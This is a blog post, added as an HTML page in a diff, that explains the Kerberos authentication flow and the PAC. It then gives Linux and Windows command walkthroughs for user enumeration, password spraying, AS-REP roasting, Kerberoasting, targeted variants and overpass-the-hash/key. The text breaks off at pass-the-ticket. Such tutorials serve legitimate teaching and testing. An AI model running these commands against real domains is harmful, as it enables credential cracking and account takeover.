@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>The Last Kerberos Read You'll Ever Need</title>
+
+    <!-- stackedit.io -->
+    <link href="https://stackedit.io/style.css" rel="stylesheet">
+    
+
+    <!-- Bootstrap Core CSS -->
+    <link href="/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link href="/css/clean-blog.min.css" rel="stylesheet">
+
+    <!-- Custom Fonts -->
+    <link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+    <link href="/css/style2.css" rel="stylesheet"> 
+
+</head>
+
+
+<body>
+    <!-- Navigation -->
+    <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+      <div class="container-fluid">
+          <!-- Brand and toggle get grouped for better mobile display -->
+          <div class="navbar-header page-scroll">
+              <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+              </button>
+              <a class="navbar-brand" href="/index.html">Eric Esquivel's Blog</a>
+          </div>
+
+          <!-- Collect the nav links, forms, and other content for toggling -->
+          <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+              <ul class="nav navbar-nav navbar-right">
+                  <li>
+                      <a href="/index.html">Home</a>
+                  </li>
+                  <li>
+                      <a href="/assets/resume.pdf">Resume</a>
+                  </li>
+                  <li>
+                      <a href="https://github.com/EricEsquivel">GitHub</a>
+                  </li>
+              </ul>
+          </div>
+          <!-- /.navbar-collapse -->
+      </div>
+      <!-- /.container -->
+  </nav>
+
+  <!-- Page Header -->
+  <!-- Set your background image for this header on the line below. -->
+  <header class="intro-header" style="background-image: url('/img/redandblack.png')">
+      <div class="container">
+          <div class="row">
+              <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                  <div class="site-heading">
+                      <h1 font color="#000000">Eric Esquivel's Blog</h1>
+                      <hr class="small">
+                      <span class="subheading"></span>
+                  </div>
+              </div>
+          </div>
+      </div>
+  </header>
+
+
+<div class="stackedit">
+<div class="stackedit__html">
+
+<!-- Post Content -->
+<h2 id="the-last-kerberos-read-you’ll-ever-need">The Last Kerberos Read You’ll Ever Need</h2>
+<p>Here is my read on the Kerberos authentication protocol that I composed from lots of different resources to help me understand the details of what exactly is being sent, while also keeping it at a high level. Hopefully this is a resource others can use to better understand the why’s and how’s of the Kerberos protocol and attacks against it. Everything is ordered in one place, split into sections, and explained in a simple enough manner to make it into a singular blog post.</p>
+<p>Now this is certainly not a quick 5 minute read, but the goal is that this is a solid read to help you learn about Kerberos and the attacks associated with it, instead of having to use a bunch of resources to learn just a couple things here and there, or break your brain and read the 137 page <a href="https://www.ietf.org/rfc/rfc4120.txt">RFC4120</a>.</p>
+<p>On that note, I will be showing attacks from both Windows &amp; Linux.</p>
+<p>Performing Windows attacks requires dropping binaries on disk unless using a C2 framework which lets you use execute-assembly. I <strong>strongly</strong> recommend using a C2 framework if you want to do the Windows version of the attacks, but I show how to do it without it just in case. Also, when using Rubeus’ createnetonly command to import tickets into cmd.exe, a high-integrity shell will import it into your current session even while using /show, while a low integrity shell will spawn cmd.exe with the ticket imported into there.</p>
+<p>Linux attacks will be done with my Kali Linux machine.</p>
+<hr>
+<h3 id="kerberos-background-information">Kerberos Background Information</h3>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-kerberos">Kerberos</a> is a stateless authentication protocol based on tickets that allows users to authenticate on the network and access services once authenticated. It is a <a href="https://en.wikipedia.org/wiki/Zero-knowledge_proof">Zero-knowledge proof</a> protocol. The <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/key-distribution-center">Kerberos Key Distribution Center (KDC)</a> does not record previous transactions; instead, the Kerberos Ticket Granting Service (TGS) relies on a valid Ticket Granting Ticket (TGT). It assumes that if a user has a valid TGT, they must have proven their identity. Kerberos uses port 88 by default and has been the default authentication protocol for domain accounts since Windows 2000. When a domain user logs into their PC, Kerberos is used to authenticate them.</p>
+<p>Active Directory will use either Kerberos or NTLM authentication. It will select Kerberos by default unless:</p>
+<ul>
+<li>It can’t be used by one of the systems involved in the authentication.</li>
+<li>The calling app didn’t provide sufficient information to use Kerberos.</li>
+</ul>
+<p>Otherwise, Negotiate always selects the <a href="https://learn.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm">NTLM</a> security provider.</p>
+<p>If you want the nitty gritty about this, read <a href="https://learn.microsoft.com/en-us/windows/win32/secauthn/microsoft-kerberos">this</a>.</p>
+<p>There are going to be 3 entities in a Kerberos authentication scenario: the user, the service, and the Key Distribution Center (KDC). There are also 3 subprotocols of Kerberos.</p>
+<p><strong>What is Kerberos authentication comprised of?</strong></p>
+<p>Here’s what Microsoft says about Kerberos:</p>
+<p>“The <a href="https://learn.microsoft.com/en-us/windows/win32/secgloss/k-gly"><em>Kerberos protocol</em></a> is composed of three subprotocols.”</p>
+<p>The KDC is a domain service on the DC. It is a single process that provides 2 services: Authentication Service (AS) and Ticket-Granting Service (TGS).</p>
+<p>When a user wants to authenticate to a service it will go through these steps:</p>
+<p>Clients obtain tickets called TGTs from the Kerberos Key Distribution Center (KDC), specifically the AS, and they present these tickets called Ticket Granting Tickets (TGTs) to the TGS where they receive a Service Ticket. The client can then send the Service Ticket to the target server. The server will inspect the Service Ticket, and then reply back to the client allowing access.</p>
+<p>The Authentication Service (AS) issues TGTs for later connecting to the TGS in its domain or any trusted domain. Before a client can ask for a ticket to another computer, it must request a TGT from the AS in the client’s domain. “The TGT can be reused until it expires, but the first access to any domain’s ticket-granting service always requires a trip to the authentication service in the client’s account domain.”</p>
+<p>Like TCP has syn syn/ack ack, Kerberos authentication has 1. AS_REQ, 2. AS_REP, 3. TGS_REQ, 4. TGS_REP, 5. AP_REQ, 6. AP_REP</p>
+<p><img src="https://cdn-images-1.medium.com/max/716/1*Mmz5wy4eC0HK0m0FAw_a1g.png" alt="https://cdn-images-1.medium.com/max/716/1*Mmz5wy4eC0HK0m0FAw_a1g.png"></p>
+<p><img src="https://cdn-images-1.medium.com/max/716/1*-Fooncxwpm63GmQKQIU7kA.png" alt="https://cdn-images-1.medium.com/max/716/1*-Fooncxwpm63GmQKQIU7kA.png"></p>
+<p><strong>The Kerberos Double Hop Problem</strong></p>
+<p>In the case of NTLM authentication, if a machine was compromised and the NTLM hash was stolen, an attacker could access anything that the user account had access to with a Pass-The-Hash attack. However, Kerberos tickets do not contain a user’s password and will specify the machine to which the ticket grants access.</p>
+<p>This is why the <a href="https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f?gi=f925425e7a42">Double Hop Problem</a> exists when accessing machines remotely via WinRM. When a non-Kerberos protocol is utilized to access a machine remotely, it is possible to use that connection to access other machines as that user without re-prompting for authentication because the NTLM password hash is tied to that session. With Kerberos authentication, credentials must be specific for every machine they want to access because there is no password.</p>
+<p><strong>Extra Information</strong></p>
+<ul>
+<li>The <a href="https://learn.microsoft.com/en-us/windows/win32/secgloss/s-gly">security principal</a> name used by the KDC in any domain is “krbtgt”. From here on when I say the KDC encrypts stuff using it’s key, it encrypts stuff using the krbtgt account’s password hash.</li>
+<li><strong>kdc-options:</strong> various flags that can be applied to a ticket</li>
+<li><strong>realm:</strong> domain name</li>
+<li><strong>cname:</strong> Client principal name; name of the requesting account</li>
+<li><strong>sname:</strong> Target service principal name (SPN) for the resulting ticket</li>
+<li><strong>padata:</strong> pre-authentication data</li>
+</ul>
+<br>
+<h2 id="the-confusion-begins-—-dissecting-the-kerberos-authentication-protocol">The Confusion Begins - Dissecting the Kerberos Authentication Protocol</h2>
+<h3 id="krb_as_req-—-authentication-service-exchange-part-1">1) KRB_AS_REQ — Authentication Service Exchange Part 1</h3>
+<p>The first step of the kerberos protocol is the KRB_AS_REQ message.</p>
+<p>In this AS_REQ message, the user will send a request to the AS for a ticket called the Ticket Granting Ticket (TGT) and they must also prove their identity through something called pre-authentication.</p>
+<p>To perform pre-authentication and prove their identity, the user will send an authenticator which is the current timestamp encrypted with the user’s key (password hash as DES, RC4, AES128 or AES256), and their username in cleartext so the KDC knows who they’re dealing with.</p>
+<p>(Technically, the first AS-REQ packet is sent without authentication data to maintain backwards compatibility. It will succeed only if the <code>DONT_REQ_PREAUTH</code> flag in the Active Directory for the target account is set. Nowadays accounts require pre-auth by default. Once it fails, it it will send another AS-REQ with the pre-auth info)</p>
+<p><img src="https://cdn-images-1.medium.com/max/716/1*9hZKhly2HwWLG5RMgDeoqA.png" alt="https://cdn-images-1.medium.com/max/716/1*9hZKhly2HwWLG5RMgDeoqA.png"><br>
+Components of an AS-REQ; picture from HackTheBox</p>
+<p>What this picture above doesn’t show is the TGT request for the krbtgt SPN; It only shows the pre-authentication. But just remember, an AS-REQ request contains the TGT request, and the pre-authentication data.</p>
+<p><img src="https://cdn-images-1.medium.com/max/716/1*YjF6zXjhWiWxPjC9qJhsCw.png" alt="https://cdn-images-1.medium.com/max/716/1*YjF6zXjhWiWxPjC9qJhsCw.png"><br>
+Components of an AS-REQ in a PCAP;</p>
+<h3 id="krb_as_rep-—-authentication-service-exchange-part-2">2) KRB_AS_REP — Authentication Service Exchange Part 2</h3>
+<p>Once the AS receives the client’s request for a TGT (AS-REQ), it will inspect the cleartext username, fetch their credentials, and attempt to decrypt the authenticator the user encrypted using those creds.</p>
+<p>If it successfully decrypted the authenticator, and the timestamp is recent, the AS will send the user an AS-REP message containing a temporary session key, and a TGT where then the user will be successfully authenticated.</p>
+<ul>
+<li>The TGT is basically a user’s identity card since it includes the user’s authorization data.</li>
+<li>By default is lasts for 8 hours before it expires.</li>
+<li>One temporary session key is placed into the TGT.</li>
+<li>The TGT is encrypted with the KDC’s key (krbtgt’s account password hash) so the user can’t tamper with it.</li>
+<li>The temporary session key is encrypted using the user’s key (password hash).</li>
+</ul>
+<p>Therefore, this session key is duplicated in the response — one version is protected with the KDC’s key, and another is protected with the user’s key.</p>
+<p><img src="https://cdn-images-1.medium.com/max/716/1*gAwtyok62vx3M1U7AmhRVQ.png" alt="https://cdn-images-1.medium.com/max/716/1*gAwtyok62vx3M1U7AmhRVQ.png"><br>
+Components of an AS-REP; picture from HackTheBox</p>
+<p><img src="https://cdn-images-1.medium.com/max/716/1*dpknmd6tTd2GIjarlBdTJQ.png" alt="https://cdn-images-1.medium.com/max/716/1*dpknmd6tTd2GIjarlBdTJQ.png"><br>
+Components of an AS-REP in a PCAP;</p>
+<p>Now by default, all accounts require pre-authentication (the client must be able to prove their identity). If pre-authentication is not required for the user, which is a setting you can set, the authentication server does not know whether the user is actually the principal named in the request. It simply sends an AS-REP without knowing or caring whether they are the same. If the user does not perform pre-authentication in the AS-REQ and the target account requires it, you will get the <code>KDC_ERR_PREAUTH_REQUIRED</code> error.</p>
+<p><strong>Note:</strong> Enabling <code>Do not require Kerberos preauthentication</code> adds the <code>DONT_REQ_PREAUTH</code> flag to the user’s <a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties">UserAccountControl</a> (UAC) attribute.</p>
+<p><img src="https://cdn-images-1.medium.com/max/716/1*KekkGP4K8RGU3qVZplG4fw.png" alt="https://cdn-images-1.medium.com/max/716/1*KekkGP4K8RGU3qVZplG4fw.png"><br>
+Setting Up “Do not require Kerberos preauthentication” in ADUC;</p>
+<h3 id="krb_tgs_req-—-ticket-granting-service-exchange-part-1">3) KRB_TGS_REQ — Ticket-Granting Service Exchange Part 1</h3>
+<p>Now that is the end of the Authentication Service part of the KDC. The next component is the Ticket-Granting Service or TGS. The TGS is responsible for issuing service tickets, where as the AS was responsible for issuing TGTs.</p>
+<p>So the user now has a TGT that it will store in its memory.</p>
+<p>The next step is for the user to request a service ticket from the Ticket Granting Service (TGS).</p>
+<p>To do this, the user will send 3 things in the TGS_REQ message to the TGS.</p>
+<ol>
+<li>The SPN of the service they want to access. Format: SERVICE/HOST</li>
+<li>The TGT they previously received from the AS which contains their information and the copy of the session key.</li>
+<li>An authenticator (current timestamp encrypted), which will now be encrypted using the session key.</li>
+</ol>
+<p><img src="https://cdn-images-1.medium.com/max/716/1*nhbQ6p0LVexQvHWH0i23AA.png" alt="https://cdn-images-1.medium.com/max/716/1*nhbQ6p0LVexQvHWH0i23AA.png"><br>
+Components of an TGS-REQ; picture from HackTheBox</p>
+<p><img src="https://cdn-images-1.medium.com/max/716/1*SHhzW3gn7AMhkfHTKoV3mQ.png" alt="https://cdn-images-1.medium.com/max/716/1*SHhzW3gn7AMhkfHTKoV3mQ.png"><br>
+Components of an TGS-REQ in a PCAP;</p>
+<h3 id="krb_tgs_rep-—-ticket-granting-service-exchange-part-2">4) KRB_TGS_REP — Ticket-Granting Service Exchange Part 2</h3>
+<p>Once the KDC (specifically the TGS) receives the <code>TGS-REQ</code> message from the user, they must verify the authenticator was encrypted with the correct session key. The TGS will decrypt the TGT (which was encrypted with krbtgt creds), take the copy of the session key that was in there, and attempt to decrypt the user’s authenticator, and evaluate it.</p>
+<p>If it successfully validated the user’s authenticator &amp; TGT, the TGS will read the requested service’s SPN and generate 2 copies of a session key for the user to share with the requested server. One copy of the service session key is encrypted with the user’s logon session key, and the other copy is placed into the Service Ticket, along with the user’s authorization data taken from the TGT, and encrypts the Service Ticket with the service account’s key/password hash so the user can’t tamper with it. The KDC sends these credentials back to the client by replying with a message of type <code>TGS-REP</code>.</p>
+<ul>
+<li>The service ticket is used by the user to interact with the target service.</li>
+<li>By default is lasts for 10 hours before it expires.</li>
+<li>A service ticket contains three elements: 1. The name of the requested service (its SPN), <strong>unencrypted</strong>. 2. A copy of the user information that was present in the TGT. The service will later read this information to determine whether or not the user has the right to use it (encrypted with service account’s key) and 3. A copy of the session key (encrypted with service account’s key).</li>
+</ul>
+<p><img src="https://cdn-images-1.medium.com/max/716/1*0_BNxO6IpgFCOoxJlGxYvg.png" alt="https://cdn-images-1.medium.com/max/716/1*0_BNxO6IpgFCOoxJlGxYvg.png"><br>
+Components of an TGS-REP; picture from HackTheBox</p>
+<p><img src="https://cdn-images-1.medium.com/max/716/1*uAGcpE-Ueb3qwib9c16f6Q.png" alt="https://cdn-images-1.medium.com/max/716/1*uAGcpE-Ueb3qwib9c16f6Q.png"><br>
+Components of an TGS-REP in a PCAP;</p>
+<p>So basically <code>TGS-REP</code> will have 2 things:</p>
+<ol>
+<li>Service ticket containing the target SPN, user auth info, &amp; a copy of the session key, all encrypted with service account’s key/pass hash</li>
+<li>Another copy of the session key encrypted with the user’s key/password hash</li>
+</ol>
+<h3 id="krb_ap_req-—-clientserver-exchange-part-1">5) KRB_AP_REQ — Client/Server Exchange Part 1</h3>
+<p>We’re finally done dealing with the KDC and all it’s parts. The final part of Kerberos authentication is for the user to interact with the target server &amp; service.</p>
+<p>The user will take a look at the <code>TGS-REP</code> from last step and extract the session key and the Service Ticket given by the TGS. The user’s copy of the session key will be decrypted and the user will transmit a user authenticator, encrypted with the session key that was just decrypted, and the Service Ticket, encrypted with the target service account’s key.</p>
+<p>The user will send an <code>AP-REQ</code> message to the target service containing the Service Ticket and the Authenticator.</p>
+<p><img src="https://cdn-images-1.medium.com/max/716/1*oUyUgn6WolNmOMJeZ5s5Jg.png" alt="https://cdn-images-1.medium.com/max/716/1*oUyUgn6WolNmOMJeZ5s5Jg.png"><br>
+Components of an AP-REQ; picture from HackTheBox</p>
+<h3 id="krb_ap_rep-—-clientserver-exchange-part-2">6) KRB_AP_REP — Client/Server Exchange Part 2</h3>
+<p>The final step in the Kerberos authentication process is here! The target service will finally receive the <code>AP-REQ</code> and extract the user authenticator and the Service Ticket. Now remember that this Service Ticket was encrypted by the KDC using the target service’s account password hash (a.k.a. key). So, the service can decrypt the Service Ticket and see the session key and the user authorization information that was embedded in it. The service will use this session key to check the validity of the authenticator that was encrypted by the user using the session key.</p>
+<p>If everything looks good, the service will read the authorization info about the user, including the groups, DACLs, and all that stuff to decide whether or not to grant them access to the service.</p>
+<p><img src="https://cdn-images-1.medium.com/max/716/1*p-RATTF5RyExaAsijdwGqA.png" alt="https://cdn-images-1.medium.com/max/716/1*p-RATTF5RyExaAsijdwGqA.png"></p>
+<p>Example of a service looking at the DACLs of a user’s access token to check for access</p>
+<p>If authentication is successful, the service will reply to the client with a <code>AP-REP</code> message which contains the current timestamp using the session key it extracted from the Service Ticket. The client can then verify that this message is coming from the service by decrypting it using the session key it knows (which should match) and they can start issuing service requests &amp; communicating together.</p>
+<hr>
+<h3 id="the-pac">The PAC</h3>
+<p>Before we proceed with the Kerberos attacks, I wanted to get in a little more detail and clarify some parts of the TGT and service tickets since it is important to know for delegations.</p>
+<p>Every time I mentioned the “user authorization” data part of a ticket or the “authorization info about the user” in a ticket that the KDC or service reads to view info about the user, I really meant to say the PAC.</p>
+<p><strong>The PAC</strong></p>
+<p>The encrypted part of a ticket that contains the user’s information is called a Privileged Attribute Certificate (PAC).</p>
+<p>Microsoft: “A Microsoft-specific <strong>authorization data present in the authorization data field of a ticket</strong>. The <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/4a624fb5-a078-4d30-8ad1-e9ab71e0bc47#gt_26456104-0afb-4afe-a92e-ac160a9efdf8">PAC</a> contains several logical components, including group membership data for authorization, alternate credentials for non-Kerberos authentication protocols, and policy control information for supporting interactive logon.”</p>
+<p>In other words, this PAC is located in the user authorization part of the ticket. It is what gets put in to the TGT (encrypted with the KDC’s account hash) when the AS gives you a TGT, and it also gets copied over to the service ticket (encrypted with the service’s account hash) by the TGS when a user requests a service ticket for a service.</p>
+<p>The <strong>TGS</strong> reads this PAC from the TGT to view information about your user like the UserAccountControl attribute to view if you are allowed to be delegated before assigning you a service ticket, etc.</p>
+<p>The <strong>service</strong> you are trying to authenticate to will read this PAC from the service ticket to view your group membership &amp; permissions to decide whether or not to grant you access; it performs authorization.</p>
+<p>Here’s a decrypted TGT including the PAC. To decrypt this TGT I had to use the krbtgt’s aes256 hash because you can see from the Encryption Type it says <code>aes256_cts_hmac_sha1_96 (etype 18)</code>.</p>
+<p><img src="https://cdn-images-1.medium.com/max/716/1*cXck0i6AQeDGc_7FimYPdA.png" alt="https://cdn-images-1.medium.com/max/716/1*cXck0i6AQeDGc_7FimYPdA.png"></p>
+<p><img src="https://cdn-images-1.medium.com/max/716/1*mXwuDdlSPU9ROHQ9QCGWTQ.png" alt="https://cdn-images-1.medium.com/max/716/1*mXwuDdlSPU9ROHQ9QCGWTQ.png"><br>
+Contents of a TGT including the PAC;</p>
+<br>
+<h2 id="abusing-the-kerberos-protocol-for-attacks">Abusing the Kerberos Protocol for Attacks</h2>
+<p>We finally made it past the steps of the Kerberos authentication protocol, and now we can begin the attacks. I do my best to cover the attacks from both Linux &amp; Windows.</p>
+<h3 id="user-enumeration--password-spraying">User Enumeration &amp; Password Spraying</h3>
+<p>To enumerate for users in the domain, we can send AS-REQs to the AS without any pre-authentication data in the request. If the AS responds with PRINCIPAL UNKNOWN, then the username does not exist, but if it prompts for pre-authentication, or if the account doesn’t require pre-auth, then we will know the username exists. A tool we can use for this is <a href="https://github.com/ropnop/kerbrute?tab=readme-ov-file">Kerbrute</a>.</p>
+<p>IF account is invalid: <code>principal_unknown</code>, no event code.</p>
+<p>IF preauth is required: <code>preauth_required</code>, no event code.</p>
+<p>IF preauth is not required &amp; we get TGT: <code>AS-REP</code>, Event ID 4768 “A Kerberos authentication ticket (TGT) was requested.”</p>
+<p>IF preauth is required and we send wrong creds: <code>preauth_failed</code>, Event ID 4771 “Kerberos pre-authentication failed.”</p>
+<p>IF preauth is required and we send correct creds: <code>AS-REP</code>, Event ID 4768 “A Kerberos authentication ticket (TGT) was requested.”</p>
+<p><strong>Enumerate users:</strong></p>
+<pre><code># Enumerate users using a username list
+kerbrute userenum users.txt --dc dc.testlab.com -d testlab.com
+</code></pre>
+<p><strong>Password Spray:</strong></p>
+<pre><code># Password spray a list of usernames with a single password
+kerbrute passwordspray users.txt 'P@ssw0rd' --dc dc.testlab.com -d testlab.com
+</code></pre>
+<h3 id="as-rep-roasting">AS-REP Roasting</h3>
+<p>If you remember from before, by default all accounts require pre-authentication to prove their identity. The user will send the AS an <code>AS-REQ</code> message containing the TGT request and the authenticator. If the user does not perform pre-authentication in the AS_REQ and the target account requires it, you will get the <code>KDC_ERR_PREAUTH_REQUIRED</code> error.</p>
+<p>Now, there is a user setting called <code>Do not require Kerberos preauthentication</code> which adds the <code>DONT_REQ_PREAUTH</code> flag to the user’s <a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties">UserAccountControl</a> (UAC) attribute and disables the requirement for pre-authentication by not requiring the authenticator in the AS-REQ message.</p>
+<p>This <code>AS-REP</code> message contains a TGT that is encrypted with the KDC’s key (krbtgt’s account password hash) so the user can’t tamper with it, AND a temporary session key is encrypted using the user’s key (password hash). AS-REP Roasting is where we take this session key encrypted with the user’s key and take it offline try to crack the user’s password.</p>
+<p><strong>Why can’t we just use their TGT?</strong></p>
+<p>Now the reason we can’t just use the TGT of the user directly &amp; request a Service Ticket is because in the next step of requesting the service ticket the message <code>TGS-REQ</code> requires the TGT, the SPN of the target service, AND an authenticator encrypted with the session key. But the session key is encrypted with the user’s key (password hash) like we just covered. So now we’re back to having to crack the hash again.</p>
+<p><strong>Abuse in Linux:</strong></p>
+<pre><code>1. # Identify AS-REP Roastable accounts using domain creds (if no creds go to step 2)
+   GetNPUsers testlab.com/Bob:'Password1'
+
+2. # Obtain hashes for all AS-REP Roastablef accounts
+   GetNPUsers testlab.com/Bob:'Password1' -request
+
+   # OR, if you don't have valid creds, supply a username wordlist.
+   GetNPUsers testlab.com/ -dc-ip 10.10.10.10 -usersfile users.txt -no-pass
+
+3. # Now crack with hashcat mode 18200
+   hashcat -m 18200 hashes.txt rockyou.txt
+</code></pre>
+<p><strong>Abuse in Windows:</strong></p>
+<pre><code>1. # Identify AS-REP Roastable accounts
+   Import-Module PowerView.ps1
+   Get-DomainUser -UACFilter DONT_REQ_PREAUTH | select samaccountname, distinguishedname, useraccountcontrol
+
+2. # Obtain the hashes for all AS-REP Roastable accounts at once
+   Rubeus.exe asreproast /nowrap
+   # OR roast a specific user by adding the /user:&lt;username&gt; flag
+
+3. # Now on your own Windows attack box, crack with hashcat mode 18200
+   hashcat.exe -m 18200 hashes.txt rockyou.txt -O
+</code></pre>
+<p><strong>Targeted AS-REP Roasting:</strong> If we have write permissions over an account, we can enable the <code>DONT_REQ_PREAUTH</code> flag instead of resetting their password, and then request the hash and crack it. This is called targeted AS-REP Roasting.</p>
+<pre><code>1. # Enable the DONT_REQ_PREAUTH flag
+   Import-Module PowerView.ps1
+   Set-DomainObject -Identity &lt;username&gt; -XOR @{useraccountcontrol=4194304} -Verbose
+
+2. # Now let's request hashes for a single user
+   Rubeus.exe asreproast /user:&lt;username&gt; /nowrap
+
+3. # To clear rerun the command
+   Set-DomainObject -Identity &lt;username&gt; -XOR @{useraccountcontrol=4194304} -Verbose
+</code></pre>
+<h3 id="kerberoasting">Kerberoasting</h3>
+<p>Kerberoasting is where we have to utilize valid credentials to go through the Kerberos authentication process all the way to step 4 to capture the Service Ticket encrypted with the service account’s key/password hash and crack it.</p>
+<p>In step 3, the user requests a service ticket from the Ticket Granting Service (TGS) with the <code>KRB_TGS_REQ</code> message containing the SPN of the service we want to access, our TGT, and our authenticator. (This is why we need valid creds)</p>
+<p>In step 4, if everything is smooth the TGS generates 2 copies of a session key for the user to share with the requested server. One copy of the service session key is encrypted with the user’s logon session key, and the other copy is placed into the Service Ticket, along with the user’s authorization data taken from the TGT, <strong>and encrypts the Service Ticket with the service account’s key/password hash</strong> so the user can’t tamper with it. The KDC then sends these credentials back to the client by replying with the <code>KRB_TGS_REP</code> message.</p>
+<p>Since we are obtaining a Service Ticket that is encrypted with the service account’s key/password hash (which is meant for the service), we can just not send it to them, and try to crack it instead.</p>
+<p><strong>Abuse in Linux:</strong></p>
+<pre class=" language-bash"><code class="prism  language-bash">1. <span class="token comment"># Identify all Kerberoastable accounts</span>
+   GetUserSPNs.py domain.local/YourUser:<span class="token string">'Password1'</span> -dc-ip dc_ip
+
+2. <span class="token comment"># Obtain the hashes for all Kerberoastable accounts at once</span>
+   impacket-GetUserSPNs domain.local/YourUser:<span class="token string">'Password1'</span> -dc-ip dc_ip -request
+
+3. <span class="token comment"># Now crack with hashcat mode 13100</span>
+   hashcat hashes.txt rockyou.txt -m 13100
+</code></pre>
+<p><strong>Abuse in Windows:</strong></p>
+<pre><code>1. # Identify Kerberoastable accounts
+   Import-Module PowerView.ps1
+   Get-DomainUser -SPN  | select samaccountname, distinguishedname, serviceprincipalname
+
+2. # Obtain the hashes for all Kerberoastable accounts at once
+   Rubeus.exe kerberoast /nowrap
+   # OR roast a specific user by adding the /user:&lt;username&gt; flag
+
+3. # Now on your Windows attack box, crack with hashcat mode 13100
+   hashcat.exe hashes.txt rockyou.txt -m 13100 -O
+</code></pre>
+<p><strong>Targeted Kerberoasting</strong></p>
+<p>If we control account with a write permission over the target account, we can add a ServicePrincipalName (SPN) to that account, request the hash and then crack it.</p>
+<p><strong>Linux:</strong> Download the Linux tool <a href="https://github.com/ShutdownRepo/targetedKerberoast/blob/main/targetedKerberoast.py">here</a>.</p>
+<pre><code># This tool will automatically try to set an SPN for each user without an SPN
+# by using the write permissions over the user object.
+# Then prints out the hash, then deletes the temporary SPN afterwards.
+targetedKerberoast.py -v -d domain.local -u 'YourUser' -p 'Password1'
+</code></pre>
+<p><strong>Windows:</strong></p>
+<pre><code>1. # Check if the target account has no SPN
+   Import-Module PowerView.ps1
+   Get-DomainUser 'victimuser' | select serviceprincipalname # should be empty
+
+2. # Set a random SPN
+   Set-DomainObject -Identity 'victimuser' -Set @{serviceprincipalname='some/randomspn'}
+
+3. # Obtain a kerberoast hash
+   Rubeus.exe kerberoast /user:&lt;victimuser&gt; /nowrap
+
+4. # Clear the SPNs of the target account &amp; check it is now gone
+   Set-DomainObject -Identity 'victimuser' -Clear serviceprincipalname
+   Get-DomainUser 'victimuser' | select serviceprincipalname # should be empty
+</code></pre>
+<h3 id="overpass-the-hashkey">OverPass the Hash/Key</h3>
+<p><strong>OverPass The Hash</strong> is the process of using a username &amp; corresponding password hash (using etype RC4 (23) which is the same as NTLM) to obtain a Kerberos Ticket Granting Ticket (TGT) for that user. We are able to utilize the TGT for a Pass the Ticket attack.</p>
+<p>It is basically going through the Kerberos authentication steps 1: sending the <code>AS-REQ</code> request to the Authentication Service (AS) by supplying the pre-auth data and the TGT request, and step 2: receiving the <code>AS-REP</code> reply from the AS which grants us a TGT (and the temporary session key encrypted using the user’s key/password hash).</p>
+<p><strong>OverPass the Hash in Linux:</strong></p>
+<pre><code># We can use impacket
+getTGT.py -hashes 'LM:NT' testlab.com/bob@dc.ip
+</code></pre>
+<p><strong>OverPass the Hash in Windows:</strong></p>
+<pre><code># You can use Rubeus
+Rubeus.exe asktgt /domain:testlab.com /user:bob /rc4:&lt;nt hash&gt; /nowrap
+</code></pre>
+<p><strong>OverPass The Key</strong> is nearly identical to OverPass The Hash, except the password hash uses etype AES-128 (17) or AES-256 (18) instead of RC4 (23). This is useful when RC4 for pre-authentication is disabled for a user which is the case for users that are in the <code>Protected Users</code> security group.</p>
+<p><strong>OverPass the Key in Linux:</strong></p>
+<pre><code># We can use impacket
+getTGT.py -aeskey &lt;aes256 or 128 hash&gt; testlab.com/bob@dc.ip
+</code></pre>
+<p><strong>OverPass the Key in Windows:</strong></p>
+<pre><code># You can use Rubeus
+Rubeus.exe asktgt /domain:testlab.com /user:bob /aes256:&lt;aes256 hash&gt; /nowrap
+</code></pre>
+<h3 id="pass-the-certificate">Pass the Certificate</h3>
+<p>Pass the Certificate is another way to obtain a TGT from the KDC as a user where you use a (X.509) certificate instead of a hash (OverPass the Hash) or a key (OverPass the Key). Typically, Kerberos uses symmetric encryption types like DES, RC4, AES128, and AES256 for pre-authentication to provide a TGT. If there is a CA (Certificate Authority) on the domain, like if the DC has ADCS installed and set up, then you can perform pre-authentication with asymmetric keys called certificates. This method is called PKINIT, or Public Key Cryptography for Initial Authentication in Kerberos.</p>
+<p><strong>Pass the Certificate in Linux:</strong></p>
+<pre><code>1. # We can use certipy to request a TGT
+   certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'
+
+   # Certipy's commands don't support PFXs with password. If you need, the following command can be used to "unprotect" a PFX file. Then you can do step above.
+   certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.pfx"
+</code></pre>
+<p><strong>Pass the Certificate in Windows:</strong></p>
+<pre><code>1. # We can request the TGT using Rubeus
+   Rubeus.exe asktgt /user:bob /certificate:&lt;base64 cert&gt; /password:&lt;cert password&gt; /domain:testlab.com /dc:dc.testlab.com /show
+</code></pre>
+<h3 id="pass-the-ticketcache">Pass-The-Ticket/Cache</h3>
+<p>A <strong>Pass the Ticket</strong> attack is where we utilize a user’s TGT to authenticate in the domain and request service tickets as the user. (We will be utilizing Pass The Ticket a lot in all of our attacks). One way to pass TGTs is to dump them from memory.</p>
